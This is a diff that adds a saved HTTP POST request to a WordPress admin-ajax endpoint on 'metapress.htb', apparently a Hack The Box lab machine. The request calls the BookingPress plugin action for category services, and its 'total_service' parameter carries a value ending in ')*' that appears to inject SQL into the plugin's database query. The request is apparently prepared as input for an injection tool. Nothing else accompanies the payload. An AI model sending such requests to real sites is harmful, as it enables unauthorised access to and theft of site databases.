@@ -1,0 +1,9 @@
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: metapress.htb
+User-Agent: curl/8.10.1
+Accept: */*
+Content-Length: 103
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+
+action=bookingpress_front_get_category_services&_wpnonce=b06cc7d246&category_id=33&total_service=-7502)*
